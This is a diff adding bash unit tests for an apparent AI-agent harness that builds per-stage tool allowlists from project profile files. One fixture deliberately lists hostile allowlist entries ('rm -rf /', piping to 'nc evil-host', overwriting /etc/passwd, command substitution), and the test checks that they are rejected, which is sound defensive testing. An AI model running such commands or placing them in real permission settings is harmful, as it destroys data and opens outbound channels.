@@ -2510,6 +2510,294 @@ fi
 rm -f "$_ENG94_ES_STDERR"
 _test_safe_rm "$_ENG94_ES_ROOT"
 
+# ─── ENG-94 QA-authored adversarial coverage (QA-ADV 1..7) ───────────────
+# Six categories the plan's Failure Mode -> Test Map either deferred ("future
+# work" / "no synthetic test") or left implicit. Concurrency is N/A: the
+# helper is purely functional and the orchestrator's claude_mutex serializes
+# dispatches, so two parallel reads cannot race. Pinned here so a future
+# refactor that accidentally widens the surface (e.g. a metachar leak, a
+# cross-stage bleed, a stray-comma regression in the composition tail) is
+# caught at unit time rather than empirically post-deploy.
+printf '\n--- ENG-94 QA-authored adversarial (QA-ADV) ---\n'
+
+# QA-ADV 1 — D-8 shell-metachar hygiene. Profile lists `Bash(cargo:*)` plus
+# seven metachar-bearing payloads. Assert only the clean pattern reaches the
+# composed output and the rejection emits NO stderr warning (the awk filter
+# silently `next`s past metachars per the implementation — no `log` call).
+# Also assert the warning surface (if any future regression starts logging)
+# does NOT leak the pattern text per D-8's "Why" + ENG-46.
+_QA_ADV1_ROOT="$(mktemp -d)"
+_test_assert_temp_path "$_QA_ADV1_ROOT"
+mkdir -p "$_QA_ADV1_ROOT/learned-rules/qa-adv1-slug"
+cat > "$_QA_ADV1_ROOT/learned-rules/qa-adv1-slug/project-profile.md" <<'PROFILE'
+---
+schema_version: 2
+---
+# Project profile — qa-adv1-slug
+## Tool allowlist
+- implementing:
+  - `Bash(cargo:*)`
+  - `Bash(echo X; rm -rf /:*)`
+  - `Bash(curl $(whoami):*)`
+  - `Bash(node | nc evil-host:*)`
+  - `Bash(go test > /etc/passwd:*)`
+  - `Bash(rm & sleep 1:*)`
+  - `Bash(echo `whoami`:*)`
+  - `Bash(foo(:*)`
+- qa: (none)
+PROFILE
+HARNESS_ROOT="$_QA_ADV1_ROOT"
+PROJECT_SLUG="qa-adv1-slug"
+_QA_ADV1_STDERR="$(mktemp)"
+_test_assert_temp_path "$_QA_ADV1_STDERR"
+_QA_ADV1_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV1_STDERR")"
+if [[ "$_QA_ADV1_OUT" == *'Bash(cargo:*)'* ]]; then
+  pass_at "QA-ADV1 (D-8 hygiene): clean Bash(cargo:*) reaches composed output"
+else
+  fail_at "QA-ADV1 (D-8 hygiene): clean Bash(cargo:*) missing from composed output" "got: $_QA_ADV1_OUT"
+fi
+for bad in 'rm -rf /' 'whoami' 'nc evil-host' '/etc/passwd' 'sleep 1' 'echo `'; do
+  if [[ "$_QA_ADV1_OUT" != *"$bad"* ]]; then
+    pass_at "QA-ADV1 (D-8 hygiene): metachar payload [$bad] dropped from composed output"
+  else
+    fail_at "QA-ADV1 (D-8 hygiene): metachar payload [$bad] leaked into composed output" "got: $_QA_ADV1_OUT"
+  fi
+done
+# Paren-imbalance rejection — `Bash(foo(:*)` has unbalanced parens after the
+# parser's outer-paren strip and should be dropped.
+if [[ "$_QA_ADV1_OUT" != *'Bash(foo(:*)'* ]]; then
+  pass_at "QA-ADV1 (D-8 hygiene): paren-imbalance payload Bash(foo(:*) dropped"
+else
+  fail_at "QA-ADV1 (D-8 hygiene): paren-imbalance payload Bash(foo(:*) leaked" "got: $_QA_ADV1_OUT"
+fi
+# Stderr must NOT contain any pattern fragment (ENG-46 + D-8: warnings never
+# echo matched pattern text). The metachar branch emits no warning at all
+# per implementation; this assertion future-pins that property.
+_QA_ADV1_STDERR_BODY="$(cat "$_QA_ADV1_STDERR" 2>/dev/null || true)"
+_QA_ADV1_LEAKED=""
+for bad in 'rm -rf' 'whoami' 'nc evil-host' '/etc/passwd' 'foo('; do
+  if [[ "$_QA_ADV1_STDERR_BODY" == *"$bad"* ]]; then
+    _QA_ADV1_LEAKED="$_QA_ADV1_LEAKED [$bad]"
+  fi
+done
+if [[ -z "$_QA_ADV1_LEAKED" ]]; then
+  pass_at "QA-ADV1 (D-8 hygiene): stderr does NOT leak any metachar pattern fragment (ENG-46 invariant)"
+else
+  fail_at "QA-ADV1 (D-8 hygiene): stderr leaked pattern fragment(s):$_QA_ADV1_LEAKED" "stderr: $_QA_ADV1_STDERR_BODY"
+fi
+rm -f "$_QA_ADV1_STDERR"
+_test_safe_rm "$_QA_ADV1_ROOT"
+
+# QA-ADV 2 — Cross-stage isolation. Profile lists implementing+qa with
+# DISTINCT tokens and omits `ui`. Assert ui composed output lacks both
+# stages' profile-derived tokens (no neighbor-stage bleed).
+_QA_ADV2_ROOT="$(mktemp -d)"
+_test_assert_temp_path "$_QA_ADV2_ROOT"
+mkdir -p "$_QA_ADV2_ROOT/learned-rules/qa-adv2-slug"
+cat > "$_QA_ADV2_ROOT/learned-rules/qa-adv2-slug/project-profile.md" <<'PROFILE'
+---
+schema_version: 2
+---
+# Project profile — qa-adv2-slug
+## Tool allowlist
+- implementing:
+  - `Bash(pytest:*)`
+- qa:
+  - `Bash(ruff:*)`
+PROFILE
+HARNESS_ROOT="$_QA_ADV2_ROOT"
+PROJECT_SLUG="qa-adv2-slug"
+_QA_ADV2_UI="$(allowed_tools_for ui 2>/dev/null)"
+if [[ "$_QA_ADV2_UI" != *'Bash(pytest:*)'* && "$_QA_ADV2_UI" != *'Bash(ruff:*)'* ]]; then
+  pass_at "QA-ADV2 (cross-stage isolation): ui composed lacks implementing/qa profile tokens"
+else
+  fail_at "QA-ADV2 (cross-stage isolation): ui composed leaked neighbor-stage tokens" "got: $_QA_ADV2_UI"
+fi
+# Stage-name prefix-match false-positive. The helper's `current_stage == STAGE`
+# guard is exact-match awk equality — pin this by giving the profile an
+# `- implement:` key (no `-ing` suffix) AND a real `- implementing:` key with
+# distinct payload, then querying `implementing`. The implementing query MUST
+# carry only its own tokens; the `implement` tokens MUST NOT leak.
+cat > "$_QA_ADV2_ROOT/learned-rules/qa-adv2-slug/project-profile.md" <<'PROFILE'
+---
+schema_version: 2
+---
+# Project profile — qa-adv2-slug
+## Tool allowlist
+- implement:
+  - `Bash(SHOULD_NOT_LEAK:*)`
+- implementing:
+  - `Bash(pytest:*)`
+PROFILE
+_QA_ADV2_IMPL2="$(allowed_tools_for implementing 2>/dev/null)"
+if [[ "$_QA_ADV2_IMPL2" == *'Bash(pytest:*)'* && "$_QA_ADV2_IMPL2" != *'SHOULD_NOT_LEAK'* ]]; then
+  pass_at "QA-ADV2 (prefix isolation): \`- implement:\` key does NOT bleed into \`implementing\` query"
+else
+  fail_at "QA-ADV2 (prefix isolation): \`- implement:\` token leaked into \`implementing\` query" "got: $_QA_ADV2_IMPL2"
+fi
+_test_safe_rm "$_QA_ADV2_ROOT"
+
+# QA-ADV 3 — Composition shape. No profile + no extras must produce a clean
+# base with no `,,` (double-comma) and no trailing `,`. The empty-segment
+# elision in `allowed_tools_for`'s composition tail (`[[ -n "$profile_tools" ]] && ...`)
+# is the load-bearing guard; pin its observable shape.
+HARNESS_ROOT="$_TEST_STUB_DIR/empty-root-qa-adv3"
+mkdir -p "$HARNESS_ROOT"
+PROJECT_SLUG="qa-adv3-no-profile"
+_QA_ADV3_OUT="$(allowed_tools_for implementing 2>/dev/null)"
+if [[ "$_QA_ADV3_OUT" != *,,* ]]; then
+  pass_at "QA-ADV3 (composition shape): empty profile + empty extras produces no double-comma"
+else
+  fail_at "QA-ADV3 (composition shape): composed output contains a double-comma" "got: $_QA_ADV3_OUT"
+fi
+if [[ "$_QA_ADV3_OUT" != *, ]]; then
+  pass_at "QA-ADV3 (composition shape): empty profile + empty extras produces no trailing comma"
+else
+  fail_at "QA-ADV3 (composition shape): composed output has trailing comma" "got: $_QA_ADV3_OUT"
+fi
+
+# QA-ADV 4 — CRLF graceful-handling. The implementation's main awk parser
+# carries a `sub(/\r$/, "")` line, suggesting CRLF tolerance intent. The
+# schema-version detector awk above it (bin/dispatch.sh:328-332) does NOT
+# strip CRLF — surfaced by this fixture during QA adversarial coverage. The
+# plan does NOT promise CRLF tolerance (the discovery-agent writer emits
+# LF-only via bash heredoc), so the OBSERVABLE contract under a CRLF profile
+# is: (a) helper returns 0 (no die), (b) composed output is well-formed
+# (no stray commas, no half-parsed pattern fragments), (c) either patterns
+# parse OR a single schema-version warning fires. Fully-tolerant CRLF
+# parsing is a follow-up (see PR summary).
+_QA_ADV4_ROOT="$(mktemp -d)"
+_test_assert_temp_path "$_QA_ADV4_ROOT"
+mkdir -p "$_QA_ADV4_ROOT/learned-rules/qa-adv4-slug"
+{
+  printf -- '---\r\n'
+  printf -- 'schema_version: 2\r\n'
+  printf -- '---\r\n'
+  printf -- '# Project profile\r\n'
+  printf -- '## Tool allowlist\r\n'
+  printf -- '- implementing:\r\n'
+  printf -- '  - `Bash(cargo:*)`\r\n'
+  printf -- '  - `Bash(bun:*)`\r\n'
+} > "$_QA_ADV4_ROOT/learned-rules/qa-adv4-slug/project-profile.md"
+HARNESS_ROOT="$_QA_ADV4_ROOT"
+PROJECT_SLUG="qa-adv4-slug"
+_QA_ADV4_STDERR="$(mktemp)"
+_test_assert_temp_path "$_QA_ADV4_STDERR"
+_QA_ADV4_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV4_STDERR")"
+_QA_ADV4_RC=$?
+if (( _QA_ADV4_RC == 0 )); then
+  pass_at "QA-ADV4 (CRLF graceful): helper returns 0 against CRLF profile (no die)"
+else
+  fail_at "QA-ADV4 (CRLF graceful): helper exited non-zero against CRLF profile (rc=$_QA_ADV4_RC)" ""
+fi
+if [[ "$_QA_ADV4_OUT" != *,,* && "$_QA_ADV4_OUT" != *, ]]; then
+  pass_at "QA-ADV4 (CRLF graceful): composed output is well-formed (no stray commas / trailing comma)"
+else
+  fail_at "QA-ADV4 (CRLF graceful): composed output is malformed under CRLF input" "got: $_QA_ADV4_OUT"
+fi
+# Either patterns load (LF parser tolerated CRLF) OR a single schema-version
+# warning fires (current behavior: schema-version awk fails to detect v2 due
+# to un-stripped \r). Both are acceptable graceful-handling outcomes — the
+# contract is "no silent half-parse, no crash". Pin BOTH branches so a
+# future fully-CRLF-tolerant fix flips cleanly.
+_QA_ADV4_WARN_COUNT="$(grep -cE '\[allowed-tools\]' "$_QA_ADV4_STDERR" 2>/dev/null || true)"
+if [[ "$_QA_ADV4_OUT" == *'Bash(cargo:*)'* ]] || [[ "$_QA_ADV4_WARN_COUNT" -ge 1 ]]; then
+  pass_at "QA-ADV4 (CRLF graceful): either patterns parse OR schema-version warning fires (current: warn fires)"
+else
+  fail_at "QA-ADV4 (CRLF graceful): silent half-parse — neither patterns loaded nor warning fired" \
+    "stderr: $(cat "$_QA_ADV4_STDERR") | got: $_QA_ADV4_OUT"
+fi
+rm -f "$_QA_ADV4_STDERR"
+_test_safe_rm "$_QA_ADV4_ROOT"
+
+# QA-ADV 5 — HARNESS_ROOT / PROJECT_SLUG empty -> empty + NO warning (D-3
+# first bullet: symmetric with _dispatch_tools_extras's `[[ -f "$CONFIG" ]] || return 0`).
+# The fail-soft branch must be SILENT (no `log` warning) — this is the
+# discriminator between "no profile configured" and "profile present but
+# malformed", and Fixture 4 only covers the latter.
+_QA_ADV5_STDERR="$(mktemp)"
+_test_assert_temp_path "$_QA_ADV5_STDERR"
+HARNESS_ROOT=""
+PROJECT_SLUG=""
+_QA_ADV5_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV5_STDERR")"
+_QA_ADV5_WARN_COUNT="$(grep -cE '\[allowed-tools\]' "$_QA_ADV5_STDERR" 2>/dev/null || true)"
+if [[ "$_QA_ADV5_OUT" != *'Bash(cargo:*)'* ]]; then
+  pass_at "QA-ADV5 (HARNESS_ROOT empty): composed output lacks profile tokens"
+else
+  fail_at "QA-ADV5 (HARNESS_ROOT empty): composed output unexpectedly carries Bash(cargo:*)" "got: $_QA_ADV5_OUT"
+fi
+if [[ "$_QA_ADV5_WARN_COUNT" == "0" ]]; then
+  pass_at "QA-ADV5 (HARNESS_ROOT empty): NO [allowed-tools] warning fired (silent fallback per D-3)"
+else
+  fail_at "QA-ADV5 (HARNESS_ROOT empty): expected 0 warnings, got $_QA_ADV5_WARN_COUNT" \
+    "stderr: $(cat "$_QA_ADV5_STDERR")"
+fi
+rm -f "$_QA_ADV5_STDERR"
+
+# QA-ADV 6 — Idempotency. Two sequential calls with identical inputs must
+# return byte-identical output. The helper has no shared state, but awk's
+# variable scoping in BEGIN blocks across multiple invocations is a
+# historically flaky surface; pin the property.
+_QA_ADV6_ROOT="$(mktemp -d)"
+_test_assert_temp_path "$_QA_ADV6_ROOT"
+mkdir -p "$_QA_ADV6_ROOT/learned-rules/qa-adv6-slug"
+cat > "$_QA_ADV6_ROOT/learned-rules/qa-adv6-slug/project-profile.md" <<'PROFILE'
+---
+schema_version: 2
+---
+## Tool allowlist
+- implementing:
+  - `Bash(cargo:*)`
+  - `Bash(bun:*)`
+PROFILE
+HARNESS_ROOT="$_QA_ADV6_ROOT"
+PROJECT_SLUG="qa-adv6-slug"
+_QA_ADV6_FIRST="$(allowed_tools_for implementing 2>/dev/null)"
+_QA_ADV6_SECOND="$(allowed_tools_for implementing 2>/dev/null)"
+if [[ "$_QA_ADV6_FIRST" == "$_QA_ADV6_SECOND" ]]; then
+  pass_at "QA-ADV6 (idempotency): two sequential allowed_tools_for calls produce byte-identical output"
+else
+  fail_at "QA-ADV6 (idempotency): outputs diverge between sequential calls" \
+    "first: $_QA_ADV6_FIRST | second: $_QA_ADV6_SECOND"
+fi
+_test_safe_rm "$_QA_ADV6_ROOT"
+
+# QA-ADV 7 — Frontmatter present but schema_version line absent. Distinct
+# from Fixture 4 (which pins schema_version: 1 explicitly). Should also
+# fall through with ONE warning, NOT silently load a default.
+_QA_ADV7_ROOT="$(mktemp -d)"
+_test_assert_temp_path "$_QA_ADV7_ROOT"
+mkdir -p "$_QA_ADV7_ROOT/learned-rules/qa-adv7-slug"
+cat > "$_QA_ADV7_ROOT/learned-rules/qa-adv7-slug/project-profile.md" <<'PROFILE'
+---
+slug: qa-adv7-slug
+generated_at: 2026-05-13T00:00:00Z
+---
+## Tool allowlist
+- implementing:
+  - `Bash(cargo:*)`
+PROFILE
+HARNESS_ROOT="$_QA_ADV7_ROOT"
+PROJECT_SLUG="qa-adv7-slug"
+_QA_ADV7_STDERR="$(mktemp)"
+_test_assert_temp_path "$_QA_ADV7_STDERR"
+_QA_ADV7_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV7_STDERR")"
+_QA_ADV7_WARN_COUNT="$(grep -cE '\[allowed-tools\] project-profile.md schema_version != 2' "$_QA_ADV7_STDERR" 2>/dev/null || true)"
+if [[ "$_QA_ADV7_OUT" != *'Bash(cargo:*)'* ]]; then
+  pass_at "QA-ADV7 (missing schema_version): composed output lacks profile tokens"
+else
+  fail_at "QA-ADV7 (missing schema_version): cargo unexpectedly loaded despite missing schema_version line" \
+    "got: $_QA_ADV7_OUT"
+fi
+if [[ "$_QA_ADV7_WARN_COUNT" == "1" ]]; then
+  pass_at "QA-ADV7 (missing schema_version): exactly one schema-version warning fired"
+else
+  fail_at "QA-ADV7 (missing schema_version): expected 1 warning, got $_QA_ADV7_WARN_COUNT" \
+    "stderr: $(cat "$_QA_ADV7_STDERR")"
+fi
+rm -f "$_QA_ADV7_STDERR"
+_test_safe_rm "$_QA_ADV7_ROOT"
+
 # Restore overrides so subsequent assertions inherit pre-fixture environment.
 HARNESS_ROOT="$_ENG94_SAVED_HARNESS_ROOT"
 PROJECT_SLUG="$_ENG94_SAVED_PROJECT_SLUG"
